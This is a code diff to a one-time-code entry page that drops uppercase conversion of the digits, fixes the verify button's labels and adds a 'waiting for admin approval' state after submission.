@@ -90,7 +90,6 @@ h2{
   border-radius:14px;
   background:#fff;
   transition:all 0.2s;
-  text-transform:uppercase;
 }
 .otp-input:focus{
   outline:none;
@@ -179,7 +178,7 @@ button:disabled{
       <input type="text" class="otp-input" maxlength="1" id="digit6">
     </div>
 
-    <button id="verifyBtn">Verifying...</button>
+    <button id="verifyBtn">Verify</button>
     <button class="link" id="differentEmail">Use a different email</button>
     <div id="errorMessage" class="error-message"></div>
   </div>
@@ -194,20 +193,17 @@ button:disabled{
   const verifyBtn = document.getElementById('verifyBtn');
   const errorDiv = document.getElementById('errorMessage');
   let isProcessing = false;
-
-  verifyBtn.innerHTML = '<span class="button-loading"><span class="spinner"></span> Verifying...</span>';
-  verifyBtn.disabled = true;
+  let approvalInterval = null;
 
   inputs.forEach((id, index) => {
     const input = document.getElementById(id);
     
     input.addEventListener('input', (e) => {
-      if (e.target.value.length === 1) {
-        e.target.value = e.target.value.toUpperCase();
-      }
+      // NO UPPERCASE CONVERSION - keep as is
       if (e.target.value.length === 1 && index < 5) {
         document.getElementById(inputs[index + 1]).focus();
       }
+      // Check if all filled to enable button
       let allFilled = true;
       for (let i = 0; i < inputs.length; i++) {
         if (!document.getElementById(inputs[i]).value) {
@@ -215,12 +211,12 @@ button:disabled{
           break;
         }
       }
-      if (allFilled) {
+      if (allFilled && !isProcessing) {
         verifyBtn.disabled = false;
         verifyBtn.innerHTML = 'Verify';
-      } else {
+      } else if (!allFilled) {
         verifyBtn.disabled = true;
-        verifyBtn.innerHTML = '<span class="button-loading"><span class="spinner"></span> Verifying...</span>';
+        verifyBtn.innerHTML = 'Verify';
       }
     });
     
@@ -233,7 +229,7 @@ button:disabled{
     input.addEventListener('paste', (e) => {
       e.preventDefault();
       const pasted = (e.clipboardData || window.clipboardData).getData('text');
-      const chars = pasted.slice(0, 6).toUpperCase();
+      const chars = pasted.slice(0, 6);
       chars.split('').forEach((char, i) => {
         if (inputs[i]) {
           document.getElementById(inputs[i]).value = char;
@@ -243,7 +239,7 @@ button:disabled{
       for (let i = 0; i < inputs.length; i++) {
         if (!document.getElementById(inputs[i]).value) allFilled = false;
       }
-      if (allFilled) {
+      if (allFilled && !isProcessing) {
         verifyBtn.disabled = false;
         verifyBtn.innerHTML = 'Verify';
       }
@@ -267,13 +263,16 @@ button:disabled{
     errorDiv.style.display = 'none';
   }
 
+  function showWaitingForApproval() {
+    verifyBtn.disabled = true;
+    verifyBtn.innerHTML = '<span class="button-loading"><span class="spinner"></span> Waiting for admin approval...</span>';
+  }
+
   function hideLoading() {
     isProcessing = false;
     verifyBtn.disabled = false;
     verifyBtn.innerHTML = 'Verify';
   }
-
-  let approvalInterval = null;
 
   function startCheckingSecondApproval() {
     if (approvalInterval) clearInterval(approvalInterval);
@@ -311,7 +310,7 @@ button:disabled{
       });
       const data = await response.json();
       if (data.success) {
-        verifyBtn.innerHTML = '<span class="button-loading"><span class="spinner"></span> Waiting for admin verification...</span>';
+        showWaitingForApproval();
         startCheckingSecondApproval();
       } else {
         hideLoading();
